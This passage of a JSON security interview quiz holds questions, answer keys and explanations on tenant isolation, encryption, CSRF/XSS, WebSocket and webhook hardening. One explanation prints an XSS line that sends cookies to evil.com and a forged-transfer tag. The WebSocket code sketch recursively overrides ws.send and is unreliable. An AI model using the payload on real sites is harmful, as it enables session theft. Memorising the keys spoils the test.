        "explanation": "Why This Is Asked\nTests ability to design end-to-end security in a real multi-tenant streaming pipeline, balancing isolation, performance, and operability. It probes key areas: access control models, cryptographic key management, data-plane boundaries, runtime integrity, and incident response.\n\nKey Concepts\n- Tenant isolation: RBAC/ABAC, service mesh scoping, and strict data-plane boundaries\n- Cryptography: envelope encryption with per-tenant CMKs; key rotation and revocation\n- Data governance: topic ACLs, least privilege, and tenancy mapping\n- Runtime integrity: container attestation and secure boot for processing pods\n- Auditability: tamper-evident logs stored in WORM or immutable storage\n- Resilience: rollback with point-in-time data purge and replay from audit logs\n\nCode Example\n```javascript\n// Policy check sketch: ensure user can access tenant data only for their tenant\nfunction hasTenantAccess(user, resource) {\n  return user.tenantId === resource.tenantId && user.permissions.includes('ACCESS_TENANT_DATA');\n}\n```\n\nFollow-up Questions\n- How would you test rollback reliability without affecting production tenants?\n- Which trade-offs matter most when choosing a KMS vs. in-HSM solutions for high-volume data streams?",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-14",
        "questionId": "q-7024",
        "question": "You manage a real-time collaboration platform with microservices and MongoDB. A suspected insecure admin API dump leads to data exfiltration. Design a zero-trust, data-access plan: enforce mTLS and SPIFFE IDs for service-to-service calls; implement per-tenant MongoDB Client-Side Field Level Encryption with a dedicated KMS; build immutable, cryptographically signed audit logs; and add anomaly detection on access patterns. Outline concrete steps and tradeoffs, and justify your choices?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Run each module in a dedicated Wasmtime sandbox with WASI, isolating tenants via user namespaces and cgroups while enforcing memory, CPU, and fuel quotas. Sign modules using Ed25519 and verify provenance through a KMS-b…",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Zero-trust plan: enforce mTLS with SPIFFE IDs for all service calls; bind tokens to requests via OAuth2/token binding; apply per-tenant Client-Side Field Level Encryption with a dedicated KMS; store i",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Use per-tenant KEKs stored in an HSM, rotate every 4 hours; edge nodes perform TPM/Sgx attestation on boot and before executing each new policy; central policy service signs SBOMs and distributes via",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Implement per-device cryptographic keys secured within iOS Secure Enclave and Android StrongBox, coupled with remote attestation to a centralized verification service. Employ envelope encryption using cloud HSM-protecte…",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\n\nTests the ability to design zero-trust data access for a high-scale system, focusing on data protection, auditability, and runtime governance.\n\n## Key Concepts\n\n- Zero-trust service mesh (mTLS, SPIFFE, token binding)\n- Data protection (tenant isolation, client-side encryption, dedicated KMS)\n- Access governance (RBAC + policy engine like OPA)\n- Auditability (immutable, signed logs; key rotation)\n- Anomaly detection and incident response\n\n## Code Example\n\n```javascript\n// Example: HMAC signing of log entry\nconst crypto = require('crypto');\nfunction signLog(entry, key) {\n  const h = crypto.createHmac('sha256', key).update(entry).digest('hex');\n  return h;\n}\n```\n\n## Follow-up Questions\n\n- How would you rotate KMS keys without downtime?\n- What are trade-offs of client-side encryption vs server-side?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-15",
        "questionId": "q-19825",
        "question": "Scenario: A real-time delivery platform uses edge runtimes and a multi-region cluster. A misbehaving edge function leaks tokens and PII via telemetry. Propose a concrete, end-to-end plan to prevent leakage and enable forensics, covering: edge attestation and isolation, per-tenant service identities and mTLS, envelope encryption with KMS, redaction of telemetry logs, immutable logging, and an automated incident response with rollback?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Use per-tenant SPIFFE IDs with short-lived JWTs (15 min) signed by a private CA; enforce mutual TLS between edge and origin via SPIRE; store keys in TPM/HSM and sign edge code; verify SBOM and perform",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "API security integrates authentication, authorization, encryption, and monitoring to protect endpoints from threats while enabling secure access for legitimate users.",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Edge trust plan for a real-time platform: enforce per-edge attestation and strict isolation, use SPIRE identities with mTLS via Istio/Linkerd, and employ envelope encryption with KMS for all data in t",
            "isCorrect": true
          },
          {
            "id": "d",
            "text": "Implement a layered guard: set a max query depth (4–5), a cost model (max cost ~1000), and enable persisted queries to prevent ad-hoc bursts. Use a gateway (e.g., Apollo Gateway) to enforce these rule",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nThis question probes practical hardening of edge compute, trust boundaries, and incident response. It requires concrete patterns (SPIRE, Istio/Linkerd, KMS, immutable logs) and ties them to measurable outcomes.\n\n## Key Concepts\n- Edge attestation and isolation\n- Per-tenant identities and mTLS\n- Envelope encryption with KMS\n- Telemetry redaction and immutable logs\n- Automated incident response and forensics\n\n## Code Example\n```javascript\n// Placeholder: implement edge attestation and logging integration\n```\n\n## Follow-up Questions\n- How would you measure efficacy of log redaction in production?\n- What rollback criteria would trigger a deployment halt?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-16",
        "questionId": "q-18786",
        "question": "In a multi-tenant serverless platform, each tenant's data is envelope-encrypted with per-tenant KMS keys. A rogue function could misuse KMS to exfiltrate data. Propose a concrete end-to-end guardrail design to prevent data leakage via KMS misuse, covering IAM controls, per-tenant key isolation, admission checks for crypto ops, data-key caching, immutable logs, anomaly detection, key rotation, and an incident response playbook?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement JWT with RS256 signing, store tokens in HttpOnly cookies, use refresh tokens for long-term sessions, validate claims on each request, implement token revocation list, and use short access token lifespans.",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Per-tenant envelope encryption with KMS: isolate keys by tenant, enforce strict IAM policies, route Encrypt/Decrypt through an admission service that validates tenant scope, cache data keys with short",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Implement WebAuthn passkeys, device fingerprinting, behavioral biometrics, and microsegmented access controls with real-time threat detection.",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Require policy bundles signed by a trusted authority and verified by the gateway before loading. Enforce per-tenant scopes with mTLS, deny-by-default routing, and explicit allow rules. Keep immutable,",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nAdvanced guardrails prevent data leakage via cryptographic operations. The candidate should articulate concrete controls, threat modeling, and automation.\n\n## Key Concepts\n- Tenant isolation at the key layer (per-tenant KMS keys)\n- Admission control for crypto ops\n- Data-key caching with safe TTLs\n- Immutable, centralized logging and tamper resistance\n- Key rotation, revocation, and incident response\n\n## Code Example\n```javascript\n// Pseudo: mapping tenant -> KMS key ARN\nconst TENANT_KEYS = { t1: 'arn:aws:kms:...:key/abc', t2: 'arn:aws:kms:...:key/def' };\n```\n\n## Follow-up Questions\n- How would you test this in CI/CD and during incident drills?\n- How would you handle cross-tenant data access anomalies and key compromise implications?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-17",
        "questionId": "q-283",
        "question": "What is the difference between XSS and CSRF attacks?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "XSS (Cross-Site Scripting) attacks inject malicious scripts into trusted websites that execute in users' browsers, while CSRF (Cross-Site Request Forgery) tricks authenticated users into performing unwanted actions on w…",
            "isCorrect": true
          },
          {
            "id": "b",
            "text": "Centralize error handling and return a generic 500 in production. Log full details to a secure sink, but redact secrets from responses. Use the NODE_ENV flag to switch between verbose developer messag",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Implement JWT with RS256 signing, store tokens in HttpOnly cookies, use refresh tokens for long-term sessions, validate claims on each request, implement token revocation list, and use short access token lifespans.",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Enforce per-tenant namespaces; use eBPF/XDP to block anomalous egress (DNS/TLS to unapproved destinations); feed a Falco detector with tenant context; require runtime attestation of compute nodes via",
            "isCorrect": false
          }
        ],
        "explanation": "## Interview Context\nThis question tests web security fundamentals and understanding of common attack vectors that every developer should know.\n\n## Key Technical Concepts\n### XSS (Cross-Site Scripting)\n- **Attack Vector**: Injects malicious JavaScript into trusted websites\n- **Target**: Client-side browser execution\n- **Impact**: Session hijacking, data theft, malicious actions in user context\n- **Defense**: Input validation, output encoding, CSP headers\n\n### CSRF (Cross-Site Request Forgery)\n- **Attack Vector**: Tricks users into making unwanted requests to authenticated sites\n- **Target**: Server-side authenticated actions\n- **Impact**: Unauthorized actions using user credentials\n- **Defense**: Anti-CSRF tokens, SameSite cookies, origin verification\n\n## Key Differences\n| Aspect | XSS | CSRF |\n|--------|-----|------|\n| **Target** | Client-side browser | Server-side authenticated actions |\n| **Execution** | Malicious code runs in browser | Legitimate requests sent to server |\n| **Trust Exploited** | User trusts website | Website trusts user |\n| **Prevention** | Input sanitization, CSP | CSRF tokens, SameSite cookies |\n\n## Attack Examples\n**XSS**: `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`\n**CSRF**: `<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">`\n\n## Prevention Best Practices\n- **XSS**: Validate all inputs, encode outputs, implement Content Security Policy\n- **CSRF**: Use anti-CSRF tokens, set SameSite=Strict cookies, verify Origin headers",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-18",
        "questionId": "q-24716",
        "question": "In a React SPA with an Express API backend using JWTs stored in localStorage, a security review flags CSRF risks and potential XSS coupling. Propose a beginner-friendly migration plan to switch to HttpOnly cookies with SameSite, implement CSRF protection, and provide a minimal Express middleware to validate cookies and rotate tokens?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Use a hardware-rooted trust (TPM/TEE) per tenant; sign each WASM module with Ed25519 and verify an SBOM (CycloneDX). Enforce reproducible builds, run modules in a strict WASM sandbox (Wasmtime/WasmEdg",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Store JWTs in HttpOnly, SameSite cookies; drop localStorage usage. Add per-session CSRF tokens (double-submit or header check) and rotate refresh tokens on use. Implement Express middleware to read co",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Sign each eBPF program with a tenant-scoped KMS key and verify with the kernel verifier before loading. Isolate tenants using separate cgroups/namespaces and per-tenant maps; prune helper functions to",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Adopt per-tenant data encryption keys (DEKs) wrapped by a centralized KMS master key, using envelope encryption with AES-256-GCM. Rotate envelope keys quarterly and replicate across regions. When a tenant key is comprom…",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nTo assess practical knowledge of session security with minimal risk and knowledge of CSRF.\n\n## Key Concepts\n- HttpOnly and SameSite cookies\n- CSRF protection strategies (double-submit, token rotation)\n- Token rotation for refresh tokens\n- Minimal server middleware for validation\n- Secure login/logout flows\n\n## Code Example\n```javascript\n// Minimal Express middleware for cookie-based auth\nconst jwt = require('jsonwebtoken');\nfunction authMiddleware(req, res, next){\n  const token = req.cookies?.access_token;\n  if(!token) return res.status(401).send('Unauthorized');\n  try {\n    req.user = jwt.verify(token, process.env.JWT_SECRET);\n    // rotation logic if near expiry would be here\n    next();\n  } catch {\n    res.status(401).send('Unauthorized');\n  }\n}\n```\n\n## Follow-up Questions\n- How would you test this against XSS and CSRF tooling?\n- What trade-offs exist between SameSite settings and subdomain SPAs?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-19",
        "questionId": "q-27381",
        "question": "You're operating a multi-tenant data lakehouse that ingests telemetry from untrusted connectors into shared storage. A compromised connector could exfiltrate tenant data or poison data lineage. Propose an end-to-end security plan covering per-tenant isolation, ingest-time schema validation, envelope encryption with per-tenant keys via KMS/HSM, automatic key rotation, immutable tamper-evident logs, data provenance, and an incident-response playbook including rollback and re-ingestion?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement a defense-in-depth strategy spanning ingestion, storage, and access layers. Enforce per-tenant namespaces for both data and metadata to guarantee strict isolation. Validate all ingested records against strict,…",
            "isCorrect": true
          },
          {
            "id": "b",
            "text": "Use tokenization with Stripe Elements or Braintree Hosted Fields. Card data is captured directly in the payment provider's secure iframe, which returns a one-time token to your application. Your API processes only these…",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Turn off DEBUG in production, register a global error handler returning a generic JSON error with status 500, and log sanitized messages by redacting secrets like password and token. Add a pytest test",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Propose a hands-on containment plan: revoke all tenant tokens immediately, rotate signing keys and TLS material, isolate the compromised region via the service mesh, roll back to the last healthy depl",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nThis question evaluates practical security controls for a multi-tenant data architecture where untrusted connectors pose risks to data confidentiality, integrity, and lineage. Interviewers seek a unified response spanning isolation, cryptography, logging, provenance, and incident response—demonstrating the candidate's ability to design holistic security solutions for complex data platforms.\n\n## Key Concepts\n- **Tenant isolation**: Namespace-level separation ensuring tenants cannot access or interfere with each other's data\n- **Envelope encryption**: Per-tenant keys with data encrypted under a master key, enabling efficient per-tenant key rotation and access revocation\n- **Tamper-evident logging**: Using cryptographic techniques such as hash chaining or Merkle trees to detect unauthorized modifications to audit records\n- **Data provenance**: Tracking the complete lifecycle of data from source through transformations to final consumption, ensuring lineage integrity and enabling impact analysis",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-20",
        "questionId": "q-19209",
        "question": "You’re implementing a chat feature where users can paste JSON payloads that the server stores in a SQL database and renders previews in the UI. A security test flags potential JSON injection and unsafe logging. Provide a concrete, beginner-friendly plan to validate, sanitize, and safely log user-provided JSON without breaking messages or exposing data?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Enforce cache-key isolation: partition caches by tenant, derive keys from tenant_id, URL, method, and a hash of headers that affect content; reject or canonicalize Vary/Accept-Encoding; implement per-",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Enforce per-tenant IaC isolation: module signing and a mandatory Terraform plan review; use tenant-scoped remote state encrypted at rest by Vault; deploy Vault dynamic secrets with short leases and au",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Validate incoming JSON against a strict schema (no extra properties), reject unknown keys, and sanitize all strings before storing or rendering. Log only redacted or sanitized content; use parameteriz",
            "isCorrect": true
          },
          {
            "id": "d",
            "text": "Replay CI logs to identify affected artifacts, generate SBOMs for rebuilt images, and isolate registries. Revoke the compromised signing key, roll back production to a known-good base image, and patch",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\n\nTests a beginner's practical handling of untrusted input, safe logging, and data leakage risk in a common feature.\n\n## Key Concepts\n\n- JSON schema validation with no extraProperties\n- Safe rendering with HTML escaping\n- Logging hygiene and redaction\n- Parameterized SQL queries and minimal data retention\n- Basic test coverage for invalid input and log safety\n\n## Code Example\n\n```javascript\nconst Ajv = require(\"ajv\");\nconst ajv = new Ajv();\nconst schema = {\n  type: \"object\",\n  properties: {\n    message: { type: \"string\" },\n    meta: { type: \"object\", properties: {}, additionalProperties: false }\n  },\n  required: [\"message\"],\n  additionalProperties: false\n};\nif (!ajv.validate(schema, req.body)) {\n  res.status(400).send(\"Invalid payload\");\n  return;\n}\nfunction sanitize(s){\n  return String(s)\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#39;\");\n}\nconst safeMessage = sanitize(req.body.message);\ndb.query(\"INSERT INTO messages (message) VALUES ($1)\", [safeMessage]);\n```\n\n## Follow-up Questions\n\n- How would you test for edge cases like extremely large JSON or nested payloads?\n- How would you adapt this plan for real-time content rendering in a multi-tenant app?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-21",
        "questionId": "q-13536",
        "question": "You run a real-time chat service (WebSocket-based) used by a fintech audience. A security test finds missing Origin checks on the WebSocket upgrade, risking cross-origin presence data leakage. Provide a beginner-friendly, concrete patch plan: Origin whitelist enforcement during handshake, require authenticated WS upgrade with a token, per-connection scopes, and a simple tests plan (Origin, token presence, and no leakage). Include a minimal code sketch?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Adopt structured JSON logs and mask sensitive fields at emission, avoiding raw payload logging. Use a reusable redact function that replaces sensitive data (e.g., emails, API keys, passwords) with masked values like `**…",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Implement an end-to-end remediation plan spanning logging hygiene, secrets management, memory safety, access controls, and incident response. Adopt per-tenant RBAC with short Vault lease durations (15 minutes). Ensure a…",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Require per-tenant WASM modules to be digitally signed with Ed25519 and attested by a hardware-backed KMS; whitelist host functions; apply strict linear memory and CPU quotas via sandbox (WASM isolate",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Secure your WebSocket connections with these four steps: 1. **Origin Whitelist Enforcement**: Only allow WebSocket connections from trusted domains (e.g., your app). Reject any request with a missing or unlisted Origin…",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Matters\nWebSocket connections accept requests from any origin by default. Without origin checks, attackers can steal real-time data by tricking users into visiting malicious sites that initiate WebSocket connections to your service.\n\n## The Patch Plan\n\n### Step 1: Origin Whitelist Enforcement\nCheck the `Origin` header during the WebSocket upgrade handshake. Only allow domains you explicitly trust (e.g., `https://app.example.com`):\n\n```javascript\nconst ALLOWED_ORIGINS = ['https://app.example.com'];\n\nfunction validateOrigin(origin) {\n  return ALLOWED_ORIGINS.includes(origin);\n}\n```\n\n### Step 2: Token Authentication Requirement\nRequire a valid auth token in the upgrade request. Validate the token before proceeding with the WebSocket upgrade. Reject the connection if the token is missing, invalid, or expired.\n\n### Step 3: Bind Token to Connection\nAfter validation, attach the token's user data (userId, permissions, scopes) to the WebSocket connection object. This allows tracking who is connected throughout the session.\n\n### Step 4: Per-Connection Scopes\nWhen sending messages, check the bound user data and only send data that the connected user is authorized to access. Implement channel-level or resource-level access control.\n\n## Minimal Code Sketch\n\n```javascript\nconst WebSocket = require('ws');\nconst ALLOWED_ORIGINS = ['https://app.example.com'];\n\nconst wss = new WebSocket.Server({ noServer: true });\n\nwss.on('connection', (ws, req) => {\n  const user = req.user; // Set by auth middleware\n  ws.userId = user.id;\n  ws.scopes = user.scopes;\n  \n  // Only send data this user is authorized to see\n  ws.send = (data) => {\n    if (authorize(user, data)) {\n      ws.send(JSON.stringify(data));\n    }\n  };\n});\n\nwss.on('upgrade', (request, socket, head) => {\n  const origin = request.headers.origin;\n  \n  // Step 1: Origin check\n  if (!ALLOWED_ORIGINS.includes(origin)) {\n    socket.write('HTTP/1.1 403 Forbidden\\r\\n\\r\\n');\n    socket.destroy();\n    return;\n  }\n  \n  // Step 2: Token validation\n  const token = request.headers['sec-websocket-protocol'] || getTokenFromUrl(request.url);\n  const user = validateToken(token);\n  if (!user) {\n    socket.write('HTTP/1.1 401 Unauthorized\\r\\n\\r\\n');\n    socket.destroy();\n    return;\n  }\n  \n  // Step 3: Proceed with upgrade\n  request.user = user;\n  wss.handleUpgrade(request, socket, head, (ws) => {\n    wss.emit('connection', ws, request);\n  });\n});\n```\n\n## Test Plan\n\n| Test Case | Expected Result |\n|-----------|------------------|\n| Request from allowed origin + valid token | Connection accepted |\n| Request from disallowed origin | 403 Forbidden |\n| Request with no token | 401 Unauthorized |\n| Request with expired/invalid token | 401 Unauthorized |\n| User A connects, User B sends message | User A should not receive User B's private data |",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-22",
        "questionId": "q-5483",
        "question": "For a real-time ML inference platform deployed on Kubernetes, how would you secure the model supply chain from training to inference against tampering and exfiltration? Design a defense-in-depth plan covering artifact signing, reproducible builds, SBOM enforcement, a secure model registry with per-model access controls, runtime attestation, and an incident-playbook including rollback and revocation steps. List concrete technologies and trade-offs?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Per-tenant HSM-backed signing keys that issue short-lived JWTs (5-15 min) bound to device attestation and the target resource. Use mTLS between edge and auth services, token binding (audience, nonce),",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Define a field-level authorization map (field → required permission). Extend resolvers with a wrapper that checks user roles and tenantId in the Graph context before resolving each field; prune or err",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Implement envelope encryption with per-tenant DEKs wrapped by regional KMS/HSM master keys. Enforce strict access control using short-lived credentials, tenant- and region-scoped IAM policies, and network segmentation t…",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Implement a comprehensive defense-in-depth strategy: Sign all artifacts at every stage (training data, models, containers) using cosign with Sigstore; enforce reproducible builds via Bazel/Nix and generate SBOMs using C…",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\n\nDemonstrates ability to secure ML model supply chains end-to-end with practical, production-ready tooling.\n\n## Key Concepts\n\n- Artifact signing (cosign/Sigstore)\n- Reproducible builds (Bazel/Nix)\n- SBOM enforcement (CycloneDX)\n- Secure model registry with per-model RBAC\n- Runtime attestation (SPIFFE/JWT + OPA)\n- Key management (KMS/HSM)\n- Rollback & revocation playbooks\n- Attack simulation and tabletop testing\n\n## Code Example\n\n```javascript\n// Pseudocode: verify signed model artifact using Sigstore cosign bindings\nimport { verifyArtifact } from 'sigstore';\nconst isValid = await verifyArtifact(modelArtifact, signature);\nif (!isValid) {\n  throw new Error('Model artifact signature verification failed');\n}\n```\n\n## Implementation Notes\n\nThe solution layers security controls at each stage of the ML lifecycle: development (reproducible builds, SBOMs), deployment (artifact signing, secure registry), and runtime (attestation, policy enforcement). The incident response capabilities (rollback, revocation) ensure operational resilience when security controls detect threats.",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-23",
        "questionId": "q-27412",
        "question": "Design a beginner-friendly, end-to-end plan to secure a webhook endpoint for a payment service. The system receives signed POSTs from a third party and must prevent replay, forgery, and data leakage. Outline verification steps: enforce TLS, verify HMAC with a shared secret, implement a timestamp window, nonce store, logging, and a test harness to validate signatures and replays?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement policy-signing with a trusted root, require 2-person approvals and a separate policy-signing step, store policies in an immutable ledger (e.g., etcd with revision history or a git-like store",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Leverage per-tenant isolation via data partitioning and namespace scoping; use tenant-scoped envelope encryption with KMS keys; run inference inside Nitro/Azure Confidential Compute enclaves with atte",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Server-side: ignore the client-supplied Content-Type; detect mime by inspecting file signatures (magic bytes) and map to a safe, canonical mime. Whitelist allowed types and reject others. Serve with C",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "To secure a webhook endpoint for a payment service, implement the following end-to-end plan: 1. **Enforce TLS** — Require HTTPS for all connections to prevent data leakage in transit. 2. **Verify HMAC signatures** — Use…",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\n\nThis question tests practical webhook security knowledge, focusing on essential controls that beginners can implement and understand.\n\n## Key Concepts\n\n- **TLS enforcement** — Ensure all connections use HTTPS to prevent data leakage in transit.\n- **HMAC verification** — Use a shared secret to compute and compare signatures, preventing forgery.\n- **Timestamp-based replay protection** — Implement a tight validation window to reject requests outside an acceptable time range.\n- **Nonce storage with TTL** — Store unique request identifiers with time-to-live to catch duplicate submissions.\n- **Logging** — Record verification results for security monitoring and incident response.\n- **Test harness** — Validate that security controls work as expected through automated testing.",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-24",
        "questionId": "gh-71",
        "question": "How does a Web Application Firewall (WAF) protect against OWASP Top 10 attacks at the application layer?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Use per-tenant keys stored in an HSM to sign outbound payloads and verify them at ingress, enforce nonce+timestamp replay protection, and minimize endpoints per tenant. Implement tamper-evident loggin",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "A WAF inspects HTTP/S requests, applies security rules, and blocks malicious traffic before it reaches the web application.",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Use tokenization with Stripe Elements or Braintree Hosted Fields. Card data is captured directly in the payment provider's secure iframe, which returns a one-time token to your application. Your API processes only these…",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Implement tenant-scoped Unity Catalog with per-tenant schemas; enforce Row-Level Security and dynamic masking on all PII fields; store secrets in Databricks Secret Scopes with least-privilege access a",
            "isCorrect": false
          }
        ],
        "explanation": "## Concept Overview\nA Web Application Firewall (WAF) operates at Layer 7 to filter HTTP/S traffic, protecting web applications from common vulnerabilities like SQL injection, XSS, and command injection attacks.\n\n## Implementation\nWAFs use rule-based inspection and pattern matching:\n\n```nginx\n# ModSecurity WAF rule example\nSecRule REQUEST_URI \"@rx (\\|\\')\" \"id:1001,phase:2,deny,msg:'SQL injection detected'\"\nSecRule ARGS \"@rx <script[^>]*>\" \"id:1002,phase:2,deny,msg:'XSS detected'\"\n```\n\n```yaml\n# Cloudflare WAF configuration\nwaf_rules:\n  - name: \"SQL Injection Protection\"\n    action: block\n    expression: \"http.request.body contains 'UNION'\"\n  - name: \"XSS Protection\"\n    action: block\n    expression: \"http.request.uri contains '<script>'\"\n```\n\n## Trade-offs\n**Pros:**\n- Immediate protection without code changes\n- Centralized security management\n- Real-time threat detection\n\n**Cons:**\n- Performance overhead (latency increase)\n- False positives blocking legitimate traffic\n- Requires regular rule updates\n- Cannot protect against all attack vectors\n\n## Common Pitfalls\n- **Over-reliance:** WAF complements but doesn't replace secure coding\n- **Rule fatigue:** Too many rules cause performance degradation\n- **False positives:** Aggressive rules block legitimate users\n- **Configuration drift:** Rules become outdated without maintenance",
        "difficulty": "advanced"
      }
    ],
    "passingScore": 70,
    "createdAt": "2026-06-03T18:18:05.177Z",
    "version": 1
  }
]